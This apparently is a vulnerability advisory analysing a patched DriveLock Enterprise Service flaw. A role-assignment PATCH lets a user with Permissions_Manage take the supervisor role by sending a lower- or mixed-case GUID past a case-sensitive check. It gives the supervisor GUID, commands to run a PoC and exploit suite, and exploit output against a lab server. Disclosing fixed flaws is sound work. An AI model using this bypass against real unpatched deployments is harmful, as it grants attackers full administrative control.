---
layout: post_collection_entry
date:   2026-03-01
categories: [patch analysis]
advisory_collection: drivelock_multi_2026_patch_analysis

title:  "[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Privilege Escalation via PATCH role assignment"
advisory:
  product: DriveLock
  homepage: https://www.drivelock.com/
  vulnerable_version: "< 25.2.4, < 25.1.7, < 24.2.9"
  fixed_version: "25.2.4, 25.1.7, 24.2.9"
  found: 2026-02-27
  cve: "ToDo"
  impact_text: HIGH
  impact_score: 7.2
  cvss: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
---

# Product description
> The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
> This means you are secure at the centre, with all paths of access to your sensitive data blocked.

*Cite: [DriveLock - Homepage](https://www.drivelock.com/en/)*

This platform includes the `DriveLock Core` component, which is an agent installed on the client machines.

# Overview
During the update of an existing role assignment, the application does not properly verify that the assigned role is the built-in `supervisor` role.

**Privileges Required**
* User required: `true`
* Permission: `PermissionType.Permissions_Manage`

## Impact
A user can assign himself the built-in `supervisor - 5964077F-DEC3-4AA5-ADAF-B56B38A7007D` role, which allows access to every existing endpoint available in the application.



# Root Cause Analysis
During the assignment of a role to a user there is a check that the assigned role is not the built-in `supervisor` role and it ensures that the user who performs the request owns all permissions which are included in the assigned role - `if (!creatorIsSupervisor && !userPermissionsLookup.has(p.type)`.

```js
    createRoleAssignment(creatorIsSupervisor, creator) {
// ....
        // 1. Fetch all permissions of the creator
        userPermissions = GetAllPermissionsForAccount(creator)
        // 2. Convert to lookup structure for fast checks
        userPermissionsLookup = CreateSet(userPermissions)

        // 3. Validate each permission required by the role
        FOR EACH permission IN role.permissions DO
            IF creatorIsSupervisor IS FALSE AND
            userPermissionsLookup DOES NOT CONTAIN permission.type THEN
                THROW UnauthorizedException(
                    "User is not allowed to assign role"
                )
            END IF
        END FOR
// ....
```

The check `user performing the request has all permissions in role` is no included in the `updateRoleAssignment`.

To further bypass the check `roleAssignment.roleId === SUPERVISOR_ROLE_ID && !token.isSupervisor` and assign the `supervisor` role the used `role-guid` must be lower case for example.

The previous mentioned check compares the provided `role-guid` as `string` variable with the following variable:
```js
SUPERVISOR_ROLE_ID = '5964077F-DEC3-4AA5-ADAF-B56B38A7007D';
```

As the `JavaScript` string operator `===` is case-sensitive, its sufficient to use a lower case version of the `role-guid` to bypass the check.

## Proof of Concept / Exploit
Setup `JWT` environment var and run the included [PoC - privEscalation-patchRoleAssignment](/assets/drivelock/poc/poc-privEscalation-patchRoleAssignment.py):
```sh
❯ export JWT="XXX"
❯ uv run poc-privEscalation-patchRoleAssignment.py
```

### Exploit
The following demonstrates the usage of the exploit suite:

```bash
❯ uv run -m drivelock.exploit -u 'test-patch@local.dev' -t doetess -P '!23456Qwertz' patch-role-assignment
[INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/login
[INFO] Login as - tenant: doetess, user: test-patch@local.dev
[INFO] Setup JWT for http.client
[DEBUG] Token: XXX
Using User GUID from JWT - 947a6e0e-30e1-4a1c-96f2-2a673760e04e
Query role assignments for user - 947a6e0e-30e1-4a1c-96f2-2a673760e04e
[INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/account/947a6e0e-30e1-4a1c-96f2-2a673760e04e/role-assignments
[INFO] Patching existing role assignment:
{
    'roleAssignmentID': 'e029df80-3441-45f2-9d07-4be037b28202',
    'roleAssignmentType': 4,
    'role': {'id': '5b359bdb-8e17-4592-9f75-6cd8f3184f27', 'flags': 2, 'displayName': 'API-Key', 'description': '', 'createdDate': '2025-12-21T08:38:27.45', 'requireMFA': False}
}
[INFO] URL: https://des-25-2-2.pentest.lab:4568/api/identity/permissions/roleAssignments
[DEBUG] Patch object:
{
    'id': 'e029df80-3441-45f2-9d07-4be037b28202',
    'userId': '947a6e0e-30e1-4A1C-96f2-2A673760E04E',
    'roleId': '5964077F-dEC3-4Aa5-adaF-b56b38a7007d',
    'name': None,
    'assignmentType': 4,
    'targetOuFilter': None,
    'targetGroup': None,
    'targetGroupName': None
}

```